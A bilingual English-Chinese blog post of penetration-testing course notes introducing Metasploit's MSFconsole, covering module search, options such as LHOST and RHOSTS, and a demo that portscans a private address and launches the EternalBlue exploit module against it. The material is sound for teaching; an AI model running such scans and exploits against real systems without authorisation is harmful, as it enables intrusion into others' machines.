---
layout: post
title: "MSFconsole Fundamentals"
date: "2022-11-25"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# MSFconsole Fundamentals
## MSFconsole Fundamentals
Before we can start using the Metasploit Framework for penetration testing, we need to get an understanding of how to use MSFconsole.

The Metasploit Framework Console (MSFconsole) is an easy-to-use all in one interface that provides you with access to all the functionality of the Metasploit Framework.

We will be utilizing MSFconsole as our primary MSF interface for the rest of the course.

# MSF 控制台基础知识
## MSF 控制台基础知识
在开始使用 Metasploit Framework 进行渗透测试之前，我们需要了解如何使用 MSFconsole。

Metasploit Framework Console (MSFconsole) 是一个易于使用的一体化界面，可让您访问 Metasploit Framework 的所有功能。

在本课程的其余部分，我们将使用 MSFconsole 作为主要的 MSF 界面。

## What You Need To Know
1. How to search for modules.
2. How to select modules.
3. How to configure module options & variables.
4. How to search for payloads.
5. Managing sessions.
6. Additional functionality.
7. Saving your configuration.

## 你需要知道什么
1. 如何搜索模块。
2. 如何选择模块。
3. 如何配置模块选项和变量。
4. 如何搜索有效负载。
5. 管理会话。
6. 附加功能。
7. 保存您的配置。

## MSF Module Variables
MSF modules will typically require information like the target & host IP address and port in order to initiate a remote exploit/connection.

These options can be configured through the use of MSF variables.

MSFconsole allows you to set both local variable values or global variable values.

|Variable|Purpose|
|---|---|
|LHOST|This variable is used to store the IP address of the attacker's system.|
|LPORT|This variable is used to store the port number on the attacker's system that will be used to receive a reverse connection.|
|RHOST|This variable is used to store the IP address of the target system/server.|
|RHOSTS|This variable is used to specify the IP addresses of multiple target systems or network ranges.|
|RPORT|This variable stores the port number that we are targeting on the target system.|


## MSF 模块变量
MSF 模块通常需要目标和主机 IP 地址和端口等信息才能启动远程利用/连接。

这些选项可以通过使用 MSF 变量进行配置。

MSFconsole 允许您设置局部变量值或全局变量值。

|变量|用途|
|---|---|
|LHOST|这个变量用来存放攻击者系统的IP地址。|
|LPORT|该变量用于存储攻击者系统上用于接收反向连接的端口号。|
|RHOST|该变量用于存储目标系统/服务器的 IP 地址。|
|RHOSTS|此变量用于指定多个目标系统或网络范围的 IP 地址。|
|RPORT|该变量存储我们在目标系统上定位的端口号。|

# Demo: MSFconsole Fundamentals（演示：MSFconsole 基础知识）
```
msf6 > help
msf6 > version 
msf6 > show all
msf6 > show exploits 
msf6 > show -h 
```

```
msf6 > search portscan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > shows options
msf6 auxiliary(scanner/portscan/tcp)> set RHOSTS 192.168.2.1
msf6 auxiliary(scanner/portscan/tcp)> set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp)> show options
msf6 auxiliary(scanner/portscan/tcp)> run 
msf6 auxiliary(scanner/portscan/tcp)> back 
```

```
msf6 > search -h
msf6 > search cve:2017 type:exploit platform:-windows # except Windows
msf6 > search cve:2017 type:exploit platform:windows
```

```
msf6 > search eternalblue
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.2.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
```

```
msf6 > sessions 
```

Banner grabbing.

```
msf6 > connect -h
msf6 > connect 192.168.2.1 80
```




